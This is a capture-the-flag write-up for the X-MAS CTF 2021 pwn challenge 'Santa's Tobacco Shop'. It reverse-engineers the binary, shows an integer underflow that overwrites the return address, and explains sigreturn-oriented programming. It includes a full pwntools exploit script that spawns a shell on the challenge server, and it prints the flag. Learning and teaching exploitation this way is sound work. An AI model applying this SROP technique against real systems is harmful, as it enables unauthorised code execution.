---
title: "XMAS Pwn: Santa's Tobacco Shop"
url: "/XMAS-Pwn-Santa-Tobacco-Shop"
date: 2021-12-22
---

## Sigreturn-Oriented Programming (SROP)

## Vulnerability Analysis

We take a look at the main function in IDA graph view and can see that a system call is made. We can quickly determine what function is being called by looking at system call number inside the `EAX` register before the system call. Also IDA has detected that the `write` function is called. We can confirm this by looking at [system call table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md) which shows that `1` is the system call number for `write`.

This is what prints the string `"Welcome to Santa's Tobbaco Shop...."` when we run the program.

Right after that we can see another function being called, `sub_4010EB` which we will deep dive inside soon. After `sub_4010EB` we can see that `write()` is called again that will print `"Goodbyte!\n"`. After this function the program exits by calling `exit()` that has the system call number of `60` which is just `0x3C` in hex.


![main_function.png](/XMAS-Pwn-Santa-Tobacco-Shop/main_function.png)

The `call sub_4010EB` will places the return address on the stack. The return address is the memory location of the instruction after `call sub_4010EB`, which is `mov eax, 1`.

This is what the entire function looks like in IDA's graph view:

![vulnerable_function_graph.png](/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_graph.png)

The best thing to do is breakdown each section and try not to get overwhelmed.

Looking inside this function (`sub_4010EB`) we can see the function prologue:

```asm
push rbp		; save old base pointer
mov rbp, rsp	; set new base pointer
push 0E8		; push 232 on the stack
sub rsp, 0x100	; allocate 0x100 bytes on the stack
```

This will push the base pointer (`old RBP`) on the stack and move the stack pointer inside the `RBP` register.

The `push 0E8` instruction pushes the number `0xE8` which is `232` in decimal, on the stack. Usually this is not part of function prologue. I will refer to this as the `loop counter or loop index` so we can remember and reference it easily later. This is number is important and will become obvious to us later.

The `sub rsp, 0x100` allocates a stack frame by subtracting `256` bytes from the stack.

![vulnerable_function_code_0.png](/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_code_0.png)

The next part shows that a system call is made calling the `write()` function. The first argument is `EDI`, the second argument is `RSI` and the 3rd `RDX`. `RAX` is just the system call number. Here is the function signature: `ssize_t write(int _fd, const void *buf, size_t count);`. This will just print `"What brand of cigarettes would you like..."`

Next, the `read()` function is called which will take input from the terminal and the function signature looks like: `ssize_t read(int fd, void *buf, size_t count);`. The important thing to note here is that. This will attempt to read `8` bytes from the file descriptor into the buffer.

An important this to note is that the buffer is stored inside the `.bss` section and since the binary does not have Position Independent Executable (PIE) enabled the offset will always be the same. This will be very important to use in the future.

![buffer_bss_location.png](/XMAS-Pwn-Santa-Tobacco-Shop/buffer_bss_location.png)


Here we can see that our buffer / input is compared with the value `"/quit"`.

You can read more about the [repe instruction](https://sites.google.com/site/microprocessorsbits/string-instructions/repe-repne-repz-repnz) and [cmpsb instruction](https://sites.google.com/site/microprocessorsbits/string-instructions/cmps-cmpsb-cmpsw) but in a nutshell the combination of these instructions compares bytes till a difference is found. This is the equivalent of `memcmp()` function in C.


```asm
mov ecx, 1
mov rdi, offset aQuit ; "/quit"
mov rsi, offset buffer
repe cmpsb
jz short locret_401193
```

![vulnerable_function_code_1.png](/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_code_1.png)


This means that even if we enter the string `/` the zero flag will be set and we will take the jump and land inside the function epilogue (quit program).


The function epilogue looks like this:

```asm
leave	; mov rbp, rsp and pop rbp (release stack frame and restore the old RBP)
retn	; pop RIP
```

This will release the stack frame / deallocate memory, restore old RBP and resume execution flow by popping the value placed on the stack at the time the function was called.

![vulnerable_function_code_2.png](/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_code_2.png)

If the jump is not taken then the next 2 instructions will check if value located at `rbp+var_8` is greater than `0xC8` which is `200`. The location at `rbp+var_8` is our loop index/counter. if it is greater than `200` then the jump is taken otherwise `"You came here more than four time!...."` is printed via a `write()` function using a system call. After that, 8 is subtracted from the loop index and the loop continues but we will look at that later.

```asm
cmp word ptr [rbp+var_8], 0C8
ja short_loc_401173
``` 

![vulnerable_function_code_3.png](/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_code_3.png)

if the jump is taken then the following instructions are execute:

```asm
mov bx, word ptr [rbp+var_8]    ; our loop counter
movzx rax,bx
add rax, rsp                    ; RSP added with our loop counter
mov rbx, ds:buffer              ; our buffer
mov [rax], rbx                  ; [rax] is some location on the stack
```

This will move the value located at `rbp+var_8` inside `bx` which is then moved inside `rax`. The value of `rax` is added with the stack pointer (`rsp`) and stored back in `rax`. Then our buffer is placed inside `rbx` and then `rbx` is placed inside the location or value of `rax` by dereferencing it. 


After that 8 bytes are subtracted from the value located inside `rbp+var_8` and a jump is made back to `loc_4010Fb`. The value located at `rbp+var_8` is our loop index.

![vulnerable_function_code_4.png](/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_code_4.png)


This means the program is in a continuously loop starting at index `232` and our loop counter is located at `rbp+var_8` with the initial value of `232`. In each iteration of the loop `8` bytes are subtracted from `232` and our input is read from and stored inside a `buffer` which is located at specific offset in  `.bss`  segment. if we input "`/quit`" or even the character `"/"` the program is terminated. Also if the loop counter is greater than `200` (`0xC8`) then our `buffer` is placed inside the memory location of a `variable` with an index of the loop counter that is located on the stack.

Confused yet? :P No problem. I always love to try and understand the program by looking at the Assembly code/instructions and because it is good practice. Besides pseudocode is not always 100% accurate. 


## Disassemble

The free version of IDA, Ghidra, Radare Cutter or Binary Ninja offers disassembly to C pseudocode.

We can press `F5` in IDA Freeware to see the C code to gain a better understanding of the program.

![vulnerable_function_code.png](/XMAS-Pwn-Santa-Tobacco-Shop/vulnerable_function_code.png)

We can see the program does what exactly what was explained above. So there are a few things to note here:

1) Our input is read and stored inside `buffer`  which is at an offset located in `.bss` segment temporary and we are only allowed to enter 8 bytes including the `\n` character.
2) The loop index starts are `232` and if the `index` is > `200` then the following line is executed `*(_QWORD *)&v3[(unsigned _int16)i] = *(_QWORD *)buffer;` else a string is printed. 
3) `v3` is a `256` byte array
4) The function prologue showed us that `256` bytes were allocated (`0x100`) on the stack
5) inputting `/` will exit the program and return result.

## The Bug

Since we are only allowed to input 8 bytes and the stack has `256` bytes of memory, to overwrite the return address we need to do send `256 + 8 + 8 + 8 = 280`. Why?

Because `_BYTE v3[256];` is `256` bytes and underneath that variable is `_int64 i;` which is `8` bytes + `8` will be old `RBP` and + `8` will be the return address. All of these variable are on the stack. They look like this:

```
_BYTE v3[256]; 			// 256 bytes
_int64 i; 				// 8 bytes
RBP						// 8 bytes 
return address 			// 8 bytes
```

But how do we send `280` bytes?

The answer is here.

1. The address of `v3` at position `i` is casted to `QWORD` pointer and then de-referenced.
2. Our buffer is casted to `QWORD` pointer and then de-referenced.
3. Our buffer is placed in a location on the stack which is determined by our index.

Take a look at this line.
`*(_QWORD *)&v3[(unsigned _int16)i] = *(_QWORD *)buffer;`

The problem is that our index or loop counter is an `int64` and is casted to an `unsigned __int16` which at each iteration is decreased by `8` bytes. This will cause an `integer underflow`.

An `unsigned __int16` goes from is `0 to 65,535` but if we include the 0 that is `65536`. We want the index to be `v3[272]` because anything after that will overwrite the return address. The index is decreased by `8` each iteration of the loop and `if index > 200` then the buffer is placed in a location on the stack.

We want our index to be `v3[272]` but it starts with `232` and when `232` hits `0` it starts from `65535` and then continues to have `8` subtracted from it. Also an important thing to note is that we can only send `8` bytes and at each iteration  `8` bytes are subtracts from the index. This may sound confusing at first but it helps to debug the program using `GDB` with `GEF` and use `pwntools` to send the payload.

## Calculation 
Based on the information provided we can calculate the offset with this formula `272 - 232 = 40` and `65536 - 40 = 65496`. The offset is at `65496`, this means we need to loop `65496` until the index is `v3[272]` and our buffer is placed on this location on the stack as shown here: `*(_QWORD *)&v3[(unsigned _int16)i] = *(_QWORD *)buffer;`


After sending this payload we successfully overwrite the return address. But we need to ensure we use `p.send()` instead of `p.sendline()` as `p.sendline()` includes a `\n` character.

```python3
def send_buffer(payload):
    p.recvuntil("What brand of cigarettes would you like to buy today? (/quit to leave)\n")
    p.send(payload)

# offset at 65496
payload = b"A" * 65496
payload += b"B" * 8
send_buffer(payload)
```

However, another problem occurs. Given that this program does not have any memory protections, the remote operating system will have `ALSR` enabled and we do not have a `JMP ESP` gadget inside the program to jump the the location of our shellcode.

```
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

So what do we do?


## Sigreturn-Oriented-Programming

A [**sigreturn**](https://man7.org/linux/man-pages/man2/sigreturn.2.html) is a system call that returns from a signal handler to clean up the stack frame after the signal has been unblocked. The system call number for this is `15` in decimal and `0xf` in hex.

The kernel pauses a process's execution when a signal occurs to jump to a signal handler routine. To ensure that the execution is safely resumed after the signal handler, the state or context of all the registers and flags are preserved/saved/pushed on the stack. However, in order to restore the state or context of all registers `sigreturn()` is called, when the signal handler is finished or completed, which will pop the values off the stack back into the registers.

### Sigcontext Structure

The length of the `sigcontext` structure is `248` bytes if we exclude `rt_sigreturn()` which is `8` bytes. The image below shows the order in which the stack must be to control the values popped into the registers.

![Sigcontext_structure.png](/XMAS-Pwn-Santa-Tobacco-Shop/Sigcontext_structure.png)

Luckily for us we don't need to set this up the manual way. Thanks to pwntools :).

## Pwntools

Note that one of gadgets is inside the binary, moves `0xf` to `eax` and then executes a `syscall`. This will be very handy to us because we need to set the value of `EAX` / `RAX` to `0xf` which is the system call number for `rt_sigreturn()`.


Note you can use [ropper](https://github.com/sashs/Ropper) to find gadgets inside the binary. We can see also look inside IDA that there is some unused code which will be useful to us.

`0x0000000000401199: mov eax, 0xf; nop; syscall;`


![sig_gadget_ida.png](/XMAS-Pwn-Santa-Tobacco-Shop/sig_gadget_ida.png)


We can can use the [SigreturnFrame](https://docs.pwntools.com/en/stable/rop/srop.html) function from pwntools and place the values we need inside the registers.

The code below will place the `0x3b` inside `frame.rax` which is a system call number for [int execve(const char *pathname, char *const argv[], char *const envp[]);](https://man7.org/linux/man-pages/man2/execve.2.html) and note that `frame.rip` is overwritten with a system call gadget `0x0000000000401114`.

`frame.rdi` has the value of `0x0000000000402001` because that is where our temporary `buffer` is stored after read. The trick is to quit using `""//bin/sh\x00""` because one of those slashes is for quitting and the other for our `/bin/sh` string, since there is no other location to store our `/bin/sh` string at a constant address that does not change. The `execve` requires a pointer to `/bin/sh` and that is the only way we can put `/bin/sh` inside the binary since that does not exist in the program already.

```python3
## Frame to call execve using SigreturnFrame for x86-64
frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 0x3b                # syscall number for execve
frame.rdi = 0x0000000000402001  # pointer to the .bss/data segment (/bin/sh 0x68732f2f6e69622f)
frame.rsi = 0x0                 # NULL
frame.rdx = 0x0                 # NULL
frame.rsp = 0xdeadbeef          # 0xdeadbeef for testing
frame.rip = 0x0000000000401114  # 0x0000000000401114: syscall;
```


Another tricky part to this challenge is that since the buffer overflow is from high to low addresses rather than the usual low to high addresses, we need to reverse the frame. This is normally not needed but since this is an int underflow that fills our buffer in reverse, we have to reverse our `frame` payload.

This can easily be done with the following:

```python
# Reverse the frame and convert to bytes
new_frame = list(frame.values())
new_frame.reverse()
send_buffer(flat(new_frame))
```


## Final PoC

In the final PoC, we used  `payload = "A" * (65496 - len(frame))` to minus the length of the frame. We then sent our `send_buffer(flat(new_frame))` reversed frame and then overwrote the return address with address `0x0000000000401199: mov eax, 0xf; nop; syscall;`. We then made sure we quit the program with `send_buffer("//bin/sh\x00")` and drop an interactive shell.


This will call `rt_sigreturn()` and pop values located at specific locations on the stack into the registers. Our registers will have the values that we put in our frame which will call `execve` giving us a shell.

```python
frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 0x3b                # syscall number for execve
frame.rdi = 0x0000000000402001  # pointer to the .bss/data segment (/bin/sh 0x68732f2f6e69622f)
frame.rsi = 0x0                 # NULL
frame.rdx = 0x0                 # NULL
frame.rsp = 0xdeadbeef          # 0xdeadbeef for testing
frame.rip = 0x0000000000401114  # 0x0000000000401114: syscall;
```


Here is the final PoC:

```python
from pwn import *

log.critical("Pwnage by memN0ps!")

# Binary to target
pwnme = './main'

# Breakpoints for GDB
## .text:0000000000401186 mov     [rax], rbx
## .text:0000000000401194 retn
gdbscript = '''
b *0x401186
b *0x401194
'''
# Arguments from the terminal (GDB, LOCAL or REMOTE)
if args['GDB']:
    p = gdb.debug(pwnme, gdbscript=gdbscript)
elif args['LOCAL']:
    elf = ELF(pwnme)
    p = elf.process()
elif args['REMOTE']:
    p = remote('challs.xmas.htsp.ro', 2002)
else:
    print("Usage: python3 {} [GDB] [LOCAL] [REMOTE]".format(sys.argv[-1]))
    sys.exit()

# Architecture
context(os="linux", arch="amd64")
context.log_level = "DEBUG"

# Allowed to send 8 bytes including 0x0a (\n). Using send instead of sendline will allow 8 bytes
def send_buffer(shellcode):
    p.recvuntil("What brand of cigarettes would you like to buy today? (/quit to leave)\n")
    p.send(shellcode) 

## Sigreturn-Oriented Programming (SROP) ##

## Frame to call execve using SigreturnFrame for x86-64
frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 0x3b                # syscall number for execve
frame.rdi = 0x0000000000402001  # pointer to the .bss/data segment (/bin/sh 0x68732f2f6e69622f)
frame.rsi = 0x0                 # NULL
frame.rdx = 0x0                 # NULL
frame.rsp = 0xdeadbeef          # 0xdeadbeef for testing
frame.rip = 0x0000000000401114  # 0x0000000000401114: syscall;

## Generate a unique pattern of uppercase letters (8 bytes)
#cyclic()
#g = cyclic_gen(string.ascii_uppercase, n=8)
#g.get(8)

# Memory Corruption via int underflow: unsigned __int16 is 0 to 65,535
# But if you include the 0 it is 65,536
# 272 - 232 = 40 and 65536 - 40 = 65496

# offset at 65496
payload = "A" * (65496 - len(frame))
send_buffer(payload)

# Reverse the frame and convert to bytes
new_frame = list(frame.values())
new_frame.reverse()
send_buffer(flat(new_frame))

# RIP overwrite for rt_sigreturn with #0x0000000000401199: mov eax, 0xf; nop; syscall;
send_buffer(p64(0x0000000000401199))

# Quit using "/" and add /bin/sh to the .bss/data segment
send_buffer("//bin/sh\x00")
log.critical("W00TW00T!")
p.interactive()

#X-MAS{1f_1n_t0b4cc0_y0u_b3li3v3_XM45_G1f75_y0u_w0n7_r3c31v3}

#https://amriunix.com/post/sigreturn-oriented-programming-srop/
#https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop
#https://anee.me/advanced-rop-techniques-16fd701909b5
#https://docs.pwntools.com/
#https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
```

W00TW00T! We can see that the exploit works on the remote box smoothly :)

![flag.png](/XMAS-Pwn-Santa-Tobacco-Shop/flag.png)

Here is the flag.
```
X-MAS{1f_1n_t0b4cc0_y0u_b3li3v3_XM45_G1f75_y0u_w0n7_r3c31v3}
```

Thanks to the challenge creator `PinkiePie1189` and the people who `organized` it (`Livian`) ;) and thanks to https://xmas.htsp.ro/login. I had fun a learned a lot. I just do pwn for fun and learning.

Hope you enjoyed my write up, sorry if I did not explain it well but it takes ages to write a quality blog and sometimes I get lazy :P

## References
* https://sites.google.com/site/microprocessorsbits/string-instructions/cmps-cmpsb-cmpsw
* https://c9x.me/x86/html/file_module_x86_id_279.html
* https://amriunix.com/post/sigreturn-oriented-programming-srop/
* https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop
* https://anee.me/advanced-rop-techniques-16fd701909b5
* https://docs.pwntools.com/
* https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
* https://github.com/sashs/Ropper
* https://0x00sec.org/t/srop-signals-you-say/2890
* https://man7.org/
* https://sites.google.com/site/microprocessorsbits/
* https://www.gnu.org/software/gdb/current/
* https://github.com/hugsy/gef